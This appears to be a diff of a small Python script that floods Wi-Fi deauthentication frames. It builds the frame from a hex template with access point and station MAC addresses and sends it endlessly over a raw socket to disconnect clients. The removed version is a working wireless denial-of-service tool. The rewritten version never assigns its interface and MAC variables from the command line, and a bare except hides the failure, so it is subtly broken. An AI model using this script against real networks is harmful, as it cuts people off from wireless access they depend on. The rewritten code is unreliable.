@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 
 
-'usage: kick <if> <wap> <sta>'
+'usage: jolt <if> <wap> <sta>'
 
 
 from socket import *
@@ -12,47 +12,38 @@ template = '00000d00048002000200010000c0003a01{0}{1}{0}706a0100'
 
 
 def mac(string):
-    return string.replace(':', str())
+  return string.replace(':', str())
 
 
 def construct(wap, sta):
-
-    string = template.format(mac(wap), mac(sta))
-    packet = bytes.fromhex(string)
-
-    return packet
+    
+  frame = bytes.fromhex(template.format(mac(wap), mac(sta)))
+  return frame
 
 
 def flood(iface, packet):
-    # use a raw socket to transmit link layer.
+  # use a raw socket to transmit link layer.
 
-    link = socket(AF_PACKET, SOCK_RAW, 0)
-    link.bind((iface, 0))
+  s = socket(AF_PACKET, SOCK_RAW, 0)
+  s.bind((iface, 0))
 
-    while True: 
-        link.send(packet)
-
-
-def start(iface, wap, sta):
-    try:
-        packet = construct(wap, sta)
-        flood(iface, packet)
-
-    except:
-        return
-        
-        
-def main():
-    if len(argv) == 4:
-
-        print('@ sending frames...')
-        start(*argv[1:])
-        
-        print('@ stopped.')
-
-    else:
-        print(__doc__)
+  while 1: 
+    s.send(packet)
 
 
-main()
+def start():
+  if len(argv) != 4:
+    return print(__doc__)
 
+  print('@ sending frames...')
+    
+  try:
+    frame = construct(wap, sta)
+    flood(iface, frame)
+
+  except:
+    return
+
+
+start()
+print('@ stopped.')
